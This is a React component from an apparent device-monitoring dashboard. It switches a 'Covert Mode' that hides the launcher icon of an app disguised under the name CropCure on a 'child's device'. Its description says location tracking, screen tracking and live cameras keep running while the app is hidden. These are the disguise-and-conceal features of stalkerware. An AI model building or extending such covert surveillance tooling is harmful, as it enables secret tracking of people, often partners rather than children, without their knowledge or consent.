import React, { useState, useEffect } from 'react';
import api from '../services/api';
import { getSocket } from '../services/socket';

export default function AppVisibilityControl({ kidDeviceId }) {
  const [isHidden, setIsHidden] = useState(false);
  const [loading, setLoading] = useState(false);
  const socket = getSocket();

  useEffect(() => {
    fetchStatus();
  }, [kidDeviceId]);

  const fetchStatus = async () => {
    try {
      const res = await api.get('/device/app/status', { params: { deviceId: kidDeviceId } });
      setIsHidden(res.data.isHidden);
    } catch (e) {
      console.error(e.message);
    }
  };

  const hideApp = async () => {
    try {
      setLoading(true);
      await api.post('/device/app/hide', { deviceId: kidDeviceId });
      setIsHidden(true);
      if (socket) {
        socket.emit('app-hide', { kidDeviceId });
      }
    } catch (e) {
      console.error(e.message);
    } finally {
      setLoading(false);
    }
  };

  const showApp = async () => {
    try {
      setLoading(true);
      await api.post('/device/app/show', { deviceId: kidDeviceId });
      setIsHidden(false);
      if (socket) {
        socket.emit('app-show', { kidDeviceId });
      }
    } catch (e) {
      console.error(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
      <h3>App Launcher Hide/Show</h3>
      <p style={{ fontSize: '14px', color: '#a39bb8' }}>
        Toggles the launcher visibility of CropCure on the child's device. When hidden, the background location, screen tracking, and live cameras remain fully active.
      </p>

      <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
        <div style={{
          fontSize: '24px',
          background: isHidden ? 'rgba(255, 56, 56, 0.15)' : 'rgba(0, 255, 135, 0.15)',
          padding: '12px',
          borderRadius: '12px',
          display: 'inline-flex'
        }}>
          {isHidden ? '🔒' : '👁️'}
        </div>
        <div>
          <span style={{ fontSize: '13px', color: '#a39bb8' }}>Current Icon Status</span>
          <h4 style={{ color: isHidden ? '#ff3838' : '#00ff87', fontWeight: 'bold', fontSize: '18px' }}>
            {isHidden ? 'Hidden (Covert Mode)' : 'Visible (Launcher Icon)'}
          </h4>
        </div>
      </div>

      <div style={{ display: 'flex', gap: '10px', marginTop: '5px' }}>
        <button 
          className="btn-ctrl" 
          onClick={hideApp} 
          disabled={isHidden || loading}
          style={{ 
            flex: 1, 
            background: isHidden ? 'rgba(255,255,255,0.02)' : 'rgba(255, 56, 56, 0.2)',
            borderColor: isHidden ? 'transparent' : '#ff3838',
            opacity: isHidden ? 0.4 : 1
          }}
        >
          🔒 Enable Hiding
        </button>
        <button 
          className="btn-ctrl" 
          onClick={showApp} 
          disabled={!isHidden || loading}
          style={{ 
            flex: 1, 
            background: !isHidden ? 'rgba(255,255,255,0.02)' : 'rgba(0, 255, 135, 0.2)',
            borderColor: !isHidden ? 'transparent' : '#00ff87',
            opacity: !isHidden ? 0.4 : 1
          }}
        >
          👁️ Show Icon
        </button>
      </div>
    </div>
  );
}
